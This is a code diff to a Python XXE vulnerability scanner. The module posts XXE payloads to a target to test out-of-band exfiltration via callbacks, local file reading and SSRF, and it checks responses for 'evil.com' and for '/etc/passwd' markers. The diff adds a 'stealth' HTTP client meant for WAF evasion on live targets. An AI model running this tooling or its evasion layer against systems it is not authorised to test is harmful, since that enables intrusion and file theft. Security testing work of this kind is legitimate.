@@ -6,13 +6,29 @@ Tests for XXE vulnerabilities:
 - Out-of-band data exfiltration via callbacks
 - Local file inclusion
 - SSRF via XXE
+
+Uses stealth HTTP client for WAF evasion on live targets.
 """
 
 import json
 import os
 import time
-import requests
 from typing import Dict, Any, List, Optional
+from urllib.parse import urlparse
+
+# Import stealth HTTP client for WAF evasion
+try:
+    from tools.http_client import safe_get, safe_post, get_stealth_session
+    USE_STEALTH = True
+except ImportError:
+    import requests
+    USE_STEALTH = False
+    
+    def safe_get(url, **kwargs):
+        return requests.get(url, **kwargs)
+    
+    def safe_post(url, **kwargs):
+        return requests.post(url, **kwargs)
 
 
 def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
@@ -46,7 +62,7 @@ def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[st
     
     # Method 1: Try POST with form data (common pattern for web forms)
     try:
-        resp = requests.post(target_url, data={"xml": xxe_payload}, timeout=10)
+        resp = safe_post(target_url, data={"xml": xxe_payload}, timeout=10)
         if "evil.com" in resp.text or callback_url in resp.text:
             result["vulnerable"] = True
             result["evidence"] = {
@@ -62,7 +78,7 @@ def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[st
     # Method 2: Try POST with raw XML content-type
     headers = {"Content-Type": "application/xml"}
     try:
-        resp = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
+        resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
         if "evil.com" in resp.text or callback_url in resp.text:
             result["vulnerable"] = True
             result["evidence"] = {
@@ -81,7 +97,7 @@ def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[st
             break
         try:
             headers = {"Content-Type": content_type}
-            resp = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
+            resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
             if "evil.com" in resp.text or callback_url in resp.text:
                 result["vulnerable"] = True
                 result["evidence"] = {
@@ -133,7 +149,7 @@ def test_xxe_file_inclusion(target_url: str) -> Dict[str, Any]:
         
         # Method 1: Try POST with form data
         try:
-            resp = requests.post(target_url, data={"xml": xxe_payload}, timeout=10)
+            resp = safe_post(target_url, data={"xml": xxe_payload}, timeout=10)
             content = resp.text.lower()
             
             indicators = ["root:", "localhost", "127.0.0.1", "bin/bash"]
@@ -153,7 +169,7 @@ def test_xxe_file_inclusion(target_url: str) -> Dict[str, Any]:
         # Method 2: Try POST with raw XML
         headers = {"Content-Type": "application/xml"}
         try:
-            resp = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
+            resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
             content = resp.text.lower()
             
             # Check for file content indicators
@@ -205,7 +221,7 @@ def test_xxe_ssrf(target_url: str, callback_url: Optional[str] = None) -> Dict[s
     
     headers = {"Content-Type": "application/xml"}
     try:
-        resp = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
+        resp = safe_post(target_url, data=xxe_payload, headers=headers, timeout=10)
         content = resp.text.lower()
         
         # Check for SSRF indicators
@@ -248,7 +264,7 @@ def discover_xxe_endpoints(base_url: str) -> List[str]:
     
     # Try to crawl for XML-related links
     try:
-        resp = requests.get(base_url, timeout=10)
+        resp = safe_get(base_url, timeout=10)
         if resp.status_code == 200:
             import re
             # Find all href links
